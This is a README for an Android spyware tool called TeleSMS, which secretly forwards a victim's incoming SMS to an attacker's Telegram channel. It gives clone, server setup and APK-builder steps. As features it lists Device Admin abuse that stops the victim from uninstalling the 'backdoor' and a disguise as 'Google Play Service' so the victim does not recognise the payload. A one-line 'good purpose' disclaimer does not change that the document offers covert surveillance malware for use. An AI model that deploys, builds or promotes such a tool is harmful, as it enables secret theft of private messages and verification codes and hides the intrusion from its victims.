# TeleSMS - Android Silent SMS Forwarder

TeleSMS is a android SMS spyware. TeleSMS hiddenly forwards incoming SMS to the Attacker via Telegram group or channel.
#### * Please use this project for good perpose only. *
#### (Please star ⭐ mark this project to support)

## It consists of two parts :
- Client side (Receives incoming messages and sends to server side)
- Server side (Forwards received messages from client side to the Telegram group or channel of the pentester.

## Prerequisites:
- Java 8 (To generate agent apk)
- API token of Telegram group or channel.

## Getting Started
- Clone this project `git clone https://github.com/HiddenPirates/TeleSMS-Android-Silent-SMS-Forwarder.git`
- Copy **_Server_** folder to root directory of Apache or Ngnix server.
- Edit **_index.php_** file and change the **_$telegram_api_key_** variable and **_$telegram_channel_or_group_id_** variable with your Telegram group or channel api token and Telegram group or channel id.
- To generate agent goto _http://server-host/apk-builder/_ and enter your TeleSMS server root url and press generate button. Wait sometime while server is generating the agent.

## Features
- Added Device Admin permission that normal users cannot uninstall the backdoor easily.
- The name of the apk file has been changed to Google Play Service so that the victim does not understand that it is a payload.


